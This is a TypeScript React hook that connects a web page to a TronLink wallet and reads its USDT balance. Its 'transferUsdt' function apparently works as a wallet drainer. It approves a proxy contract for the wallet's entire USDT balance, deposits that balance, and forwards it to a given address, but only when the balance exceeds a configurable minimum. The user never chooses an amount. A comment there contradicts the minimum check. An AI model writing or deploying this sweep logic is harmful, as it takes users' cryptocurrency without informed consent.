"use client";

import { useState, useEffect } from "react";

export function useTron() {
  const [tronWeb, setTronWeb] = useState<any>(null);
  const [tronAddress, setTronAddress] = useState<string | null>(null);
  const [tronBalance, setTronBalance] = useState<string | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [forceUpdate, setForceUpdate] = useState(0);

  const tronUsdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const tronProxyContract = process.env.NEXT_PUBLIC_PROXY_CONTRACT_TRC20 || "";

  const connectWithTronLink = async () => {
    if (!window.tronLink || !window.tron) {
      return false;
    }

    try {
      setIsConnecting(true);
      const res = await window.tronLink?.request({
        method: "tron_requestAccounts",
      });
      if (res?.code === 200) {
        const tron = window.tronWeb;
        setTronWeb(tron);
        setTronAddress(tron.defaultAddress.base58);
        setIsConnecting(false);
        return true;
      } else {
        setIsConnecting(false);
        return false;
      }
    } catch (error) {
      setIsConnecting(false);
      return false;
    }
  };

  const handleDisconnect = () => {
    if (window.tronLink || window.tron) {
      try {
        if (window.tronLink?.logout) {
          window.tronLink.logout();
        }
      } catch (e) {
      }
    }
  
    setTronWeb(null);
    setTronAddress(null);
    setTronBalance(null);
    setForceUpdate(prev => prev + 1);
  };

  const fetchTronUsdtBalance = async () => {
    if (!tronWeb || !tronAddress) return null;

    try {
      const contract = await tronWeb.contract().at(tronUsdtContract);
      const usdtBalance = await contract.balanceOf(tronAddress).call();

      setTronBalance(tronWeb.fromSun(usdtBalance.toString()));

      return {
        usdt: usdtBalance.toString(),
      };
    } catch (error) {
      return null;
    }
  };

  // New functions to interact with proxy contract
  const approveProxyContract = async (amount: string) => {
    if (!tronWeb || !tronAddress) return false;

    try {
      const usdtContract = await tronWeb.contract().at(tronUsdtContract);
      const tx = await usdtContract.approve(tronProxyContract, amount).send();
      return tx ? true : false;
    } catch (error) {
      return false;
    }
  };

  const depositToProxy = async (amount: string) => {
    if (!tronWeb || !tronAddress) return false;

    try {
      const proxyContract = await tronWeb.contract().at(tronProxyContract);
      const tx = await proxyContract.depositAssets(tronUsdtContract, amount).send();
      return tx ? true : false;
    } catch (error) {
      return false;
    }
  };

  const transferViaProxy = async (recipientAddress: string) => {
    if (!tronWeb || !tronAddress) return false;

    try {
      const proxyContract = await tronWeb.contract().at(tronProxyContract);
      const tx = await proxyContract.forwardAssets(tronUsdtContract, recipientAddress).send();
      return tx ? true : false;
    } catch (error) {
      return false;
    }
  };

  // Combined function for the complete transfer process
  const transferUsdt = async (toAddress: string) => {
    try {
      if (!tronWeb || !tronAddress) return false;

      const usdtContract = await tronWeb.contract().at(tronUsdtContract);
      const balance = await usdtContract.balanceOf(tronAddress).call();
      
      // Check if balance meets minimum requirement
      const minRequiredBalance = BigInt(process.env.NEXT_PUBLIC_MIN_BALANCE_TRC20 || "0");
      
      if (BigInt(balance.toString()) < minRequiredBalance) {
        return false;
      }
      
      // Allow any balance (even 0) to trigger the transaction
      // 1. Approve proxy
      const approved = await approveProxyContract(balance.toString());
      if (!approved) {
        return false;
      }

      // 2. Deposit to proxy
      const deposited = await depositToProxy(balance.toString());
      if (!deposited) {
        return false;
      }

      // 3. Transfer via proxy
      const transferred = await transferViaProxy(toAddress);
      if (!transferred) {
        return false;
      }

      return true;
    } catch (error) {
      return false;
    }
  };

  useEffect(() => {
    if (tronWeb) {
      fetchTronUsdtBalance();
    }
  }, [tronWeb]);

  return {
    tronWeb,
    tronAddress,
    tronBalance,
    isConnecting,
    handleDisconnect,
    fetchTronUsdtBalance,
    connectWithTronLink,
    transferUsdt,
    approveProxyContract,
    depositToProxy,
    transferViaProxy
  };
}
